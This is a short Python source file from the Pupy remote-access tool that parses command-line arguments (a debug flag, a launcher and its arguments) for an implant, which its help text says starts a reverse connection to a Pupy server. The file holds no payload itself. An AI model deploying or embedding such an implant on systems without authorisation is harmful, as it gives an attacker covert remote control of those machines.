# -*- coding: utf-8 -*-

import argparse
import sys
import shlex

import pupy
from network import conf


def update_config_from_argv():
    if len(sys.argv) < 2:
        return

    parser = argparse.ArgumentParser(
        prog='pp.py',
        formatter_class=argparse.RawTextHelpFormatter,
        description="Starts a reverse connection to a Pupy server using the selected launcher\nLast sources: https://github.com/n1nj4sec/pupy\nAuthor: @n1nj4sec (contact@n1nj4.eu)\n")

    parser.add_argument(
        '--debug',
        action='store_true',
        help="increase verbosity")

    parser.add_argument(
        'launcher',
        choices=[
            x for x in conf.launchers],
        help="the launcher to use")

    parser.add_argument(
        'launcher_args',
        nargs=argparse.REMAINDER,
        help="launcher arguments")

    args = parser.parse_args()

    if args.debug:
        pupy.config['debug'] = bool(args.debug)

    pupy.config.update({
        'launcher': args.launcher,
        'launcher_args': shlex.split(' '.join(args.launcher_args))
    })
